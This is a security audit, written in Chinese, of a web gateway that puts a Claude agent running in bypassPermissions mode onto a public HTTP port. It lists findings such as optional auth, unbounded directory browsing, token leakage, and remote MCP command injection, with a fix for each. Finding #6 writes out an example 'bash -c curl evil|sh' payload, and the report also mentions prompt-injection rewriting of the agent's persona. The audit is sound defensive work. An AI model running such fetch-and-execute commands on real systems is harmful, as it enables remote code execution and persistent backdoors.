# claude-hermes Web 网关安全审计

审计对象:`claude_hermes/gateway/adapters/web.py`(921 行,aiohttp 单进程 Web 网关)
+ 前端单页 `claude_hermes/gateway/adapters/web_static/index.html`(2305 行)
+ 配置 `claude_hermes/config.py`。

威胁模型:攻击者能访问公网 URL(cloudflared/Tailscale 隧道后),或能让 Claude 处理一段恶意文本(prompt injection)。

对照基线:Claude Code 本地版默认只绑 stdin/本机、每个危险工具调用需显式授权、无长驻公网监听面。本网关把"一个能 `bypassPermissions` 执行任意代码 + 自我修改 + 读写记忆"的 agent 挂到了一个 HTTP 端口上,一旦经隧道公网化,攻击面显著大于本地 Claude Code。

---

## 严重

### 1. 鉴权可被完全关闭,且这是"能用"的默认姿态 —— 陌生人拿到 URL 即可执行任意代码
- **文件:行号**:`claude_hermes/gateway/adapters/web.py:166-170`(`_ok_token`),`claude_hermes/config.py:126`(`WEB_AUTH_TOKEN` 默认空串),`.env.example:78`(`WEB_AUTH_TOKEN=` 出厂留空)
- **代码**:`if not config.WEB_AUTH_TOKEN: return True  # 未设口令 = 不校验`
- **攻击场景**:用户按 README 开 `WEB_ENABLED=1` + cloudflared 隧道,但没填 `WEB_AUTH_TOKEN`(出厂即空),隧道 URL 一旦泄露(cloudflared 的 `*.trycloudflare.com` 是可枚举/会进日志的),任何人 POST `/send` 就能让 `bypassPermissions` 模式的 Claude 跑 shell、读密钥、`restart_self` 改自身代码。
- **修复建议**:`WEB_ENABLED=1` 且 `WEB_HOST` 非 `127.0.0.1`(或检测到隧道)时,启动即因缺 `WEB_AUTH_TOKEN` 而 **拒绝启动**(fail-closed),而非打印 `⚠️ 未设口令(任何人可用)` 后照常上线(web.py:917-921)。

### 2. 目录浏览接口把整块硬盘目录结构暴露给任意已认证请求(无路径边界)
- **文件:行号**:`claude_hermes/gateway/adapters/web.py:374-404`(`_handle_browse`)
- **代码**:`raw = request.query.get("dir") or str(Path.home()); base = Path(os.path.expanduser(raw)).resolve()` —— 对 `dir` 参数无任何根目录限制,`?dir=/` 直接列根,`?dir=/etc` 列 `/etc`。
- **攻击场景**:拿到口令(或口令为空,见 #1)的攻击者用 `/browse?dir=/Users/wesley/.ssh/..`、`?dir=/` 枚举整机目录,为后续读文件/投毒探路。这与 Claude Code "必须显式授权目录访问" 的模型相反 —— 这里是默认全盘可枚举。
- **修复建议**:把 `_handle_browse` 的可浏览范围限制在白名单根(如已登记的项目目录 + `~`),`resolve()` 后校验 `target` 必须落在允许根内,否则拒绝。

---

## 高

### 3. 认证令牌用 `==` 明文比较(时序侧信道)且可放进 URL query(易泄露)
- **文件:行号**:`claude_hermes/gateway/adapters/web.py:169-170`,`284`(`/events` 也接受 `?token=`/`?last_id`),前端 `index.html:842`(默认走 `X-Auth-Token` 头)
- **代码**:`tok = request.headers.get("X-Auth-Token") or request.query.get("token") or ""; return tok == config.WEB_AUTH_TOKEN`
- **攻击场景**:(a) `==` 是短路比较,理论上可按字节时序爆破令牌(隧道网络抖动大,实际难度高但属真实弱点);(b) 令牌可经 `?token=` 传入 —— 一旦出现在 cloudflared 访问日志、浏览器历史、`Referer` 中即泄露,等于交出全部控制权。
- **修复建议**:改用 `hmac.compare_digest(tok, config.WEB_AUTH_TOKEN)` 做常量时间比较;并去掉/弃用 query 里的 `token`,只认请求头或 Cookie。

### 4. 会话/项目越权:任意已认证请求可读写、切分支到任意 conv 与任意已登记项目
- **文件:行号**:`web.py:317`(`conv = str(body.get("conv") or "main")`),`web.py:516-522`(`/history`),`web.py:598-632`(`/conv/git` 与建分支),`config.py:165-192`(`resolve_session_key` / `project_cwd_for`)
- **代码**:`conv` 完全由客户端指定,后端不校验其归属;`p<hash>:<conv>` 形态可直接取到 `session_store.path_for_hash()` 返回的项目工作目录,并在其中 `git checkout -b`。
- **攻击场景**:本网关是单用户模型(只有一个口令,无 per-user 概念),所以"越权读别人会话"在正常部署下不成立;**但** 一旦口令被撞开/泄露(#1/#3),攻击者即可用 `/history?conv=...` 读全部历史、用 `/conv/git/branch` 在任一登记项目里建分支扰动工作区。属于"认证边界一破、内部零隔离"的放大器。
- **修复建议**:短期接受"单用户"设定但在文档中写明"口令 = 全盘控制";长期若要多用户,须把 conv/project 绑定到登录身份并做归属校验。

### 5. 无 CSRF 防护 + 状态变更接口全用简单 JSON POST
- **文件:行号**:`web.py:877-912`(路由表,所有 POST 无 CSRF token),全局无 `Access-Control-*`/`Origin`/`Referer` 校验(grep 确认 `gateway/` 内无任何 CORS 或 Origin 检查)
- **攻击场景**:若用户把口令记进浏览器后,令牌其实是放 `localStorage`(index.html:854)并经 `X-Auth-Token` **自定义头** 发送 —— 自定义头会触发 CORS 预检,跨站页面默认拿不到令牌也加不了该头,**这一点反而挡住了经典 CSRF**。真正的残余风险是:`/send` 等也接受 query `token`(#3),且若用户曾用 `?token=` 打开过,历史 URL 可被 CSRF 式 `<img>`/`fetch` 复用。此外网关完全不校验 `Origin`,DNS-rebinding 攻击本机 `127.0.0.1:8848` 时无二次防线。
- **修复建议**:对所有状态变更请求校验 `Origin`/`Host` 白名单(拒绝非预期 Host,防 DNS rebinding);彻底移除 query 令牌通道。

---

## 中

### 6. MCP / 设置接口允许远程注入任意 stdio 命令(经认证后即 RCE 的第二条路)
- **文件:行号**:`web.py:687-745`(`_handle_settings_mcp_external` + `_clean_mcp_config`)
- **代码**:`{"type":"stdio","command":command,"args":args,"env":env,...}` —— 前端可提交任意 `command`,后续会被 SDK 作为 MCP server 拉起。
- **攻击场景**:认证被破后,攻击者 POST `/settings/mcp/external` 注册一个 `command: bash args: ["-c","curl evil|sh"]` 的 stdio MCP,借配置持久化实现开机自启后门 —— 比一次性 `/send` 更隐蔽持久。
- **修复建议**:此接口本质是"远程改可执行配置",风险等同 RCE;至少对 `command` 做白名单/确认弹窗(复用 APPROVAL_GATE 那套人工确认),或对 Web 端禁用外部 stdio MCP 注册。

### 7. 记忆/AGENTS 文件写接口 —— 路径遍历已挡住,但可被 prompt-injection 借道改人设
- **文件:行号**:`web.py:766-778`(`_safe_brain_path`),`web.py:792-814`(`_handle_file_save`)
- **评估**:路径遍历 **已正确防护**:`rel` 强制 `.md` 结尾、`resolve()` 后校验 `target == root or root in target.parents`,`..` 越界会被拒(web.py:776-777)。写入还限制在"已存在文件或 `memory/` 下新建"。**这一条是查过后判定安全的**。残余风险仅在于:AGENTS.md(人设)可被 Web 端整体覆盖 —— 若攻击者已认证,可改写 agent 的系统级人设(越狱式提权)。
- **修复建议**:保持现有路径校验;对 AGENTS.md 这类"改行为"的文件,写入前加人工确认。

### 8. 语音转写接口把上传音频代理到外部服务,可被当作 SSRF/流量放大跳板
- **文件:行号**:`web.py:452-514`(`_handle_transcribe` → `_transcribe`)
- **评估**:目标 URL 固定为 `config.STT_BASE_URL`,**攻击者不能控制目的地**,所以不是任意 SSRF。但认证后可反复上传大音频触发对 SiliconFlow 的付费调用(账单放大)。`client_max_size=32MB`(web.py:878)限制单次体积。
- **修复建议**:低优先;可加每分钟转写次数限流。

---

## 低 / 已查明为安全

### 9. XSS —— 消息渲染:已查,基本安全
- **文件:行号**:`index.html:787`(`esc`),`866-913`(`inlineMd`/`mdToHtml`),`1652`(`ai` 气泡走 `mdToHtml`,`me` 气泡走 `textContent`)
- **评估**:
  - `inlineMd` **先** `t = esc(t)` 转义 `& < > " '`,**之后** 才拼 HTML,故无法闭合属性或注入标签。
  - Markdown 链接与裸链接正则都硬性限定 `https?://`(index.html:869,874),`javascript:`/`data:` URI 无法进入 `href`,挡住了伪协议 XSS。
  - 所有工具卡片的命令 / diff / 结果体(`index.html:1907-1908, 1937, 1939, 1990, 1995`)用 `textContent` 或对入参 `esc()`;`toolCardShell` 的 `title` 只接静态串或已 `esc` 的名字,`pathText` 在 :1898 内部 `esc`。
  - 图片走 `img.src=u`(:1654),`src` 不执行 JS。
  - **判定:当前代码路径下未发现可利用的 XSS 注入点。** 唯一可提的改进:自建 Markdown 渲染器是"逐个字符串拼 HTML",任何未来新增的 innerHTML 分支只要忘了 `esc` 就会破防 —— 建议加一条 `Content-Security-Policy`(如 `script-src 'self'`)作纵深防御,现无 CSP 头。

### 10. 路径遍历(整体)—— 除 #2 外均已防护
- 图标接口 `_handle_icon` 用固定白名单 `_ICONS`(web.py:840-848),静态文件不接受用户路径。记忆文件读写见 #7 已校验。**这些点查过是安全的。** 唯一真实的"按路径读"越权是 #2 的 `/browse`(只列目录不读内容,但仍属信息泄露)。

### 11. 令牌与配置对第三方 provider key 的处理
- `config.py:35` 主动 `pop("ANTHROPIC_API_KEY")` 防误走按量计费,属正向设计,非漏洞。Web 端不回显任何 key。查过,无泄露。

---

## 与 Claude Code 本地版的差距总结

| 维度 | Claude Code 本地 | 本 Web 网关 |
|---|---|---|
| 网络面 | 无长驻公网监听 | 隧道后长驻公网 HTTP |
| 危险工具授权 | 每次显式确认 | `bypassPermissions` 默认自动执行(config.py:89) |
| 认证 | 本机进程边界 | 单口令,且可留空(#1)、可时序爆破(#3) |
| 目录访问 | 需显式授权 | `/browse` 默认全盘可枚举(#2) |
| 配置改写 | 本地文件 | 远程可注入 stdio MCP(#6)、改 AGENTS 人设(#7) |

**最优先修复顺序**:#1(fail-closed 强制口令)→ #3(常量时间比较 + 去掉 query token)→ #2(`/browse` 加根白名单)→ #6(MCP 注入加确认)。前两条几乎零成本,却直接决定"隧道一开是否等于把机器交出去"。
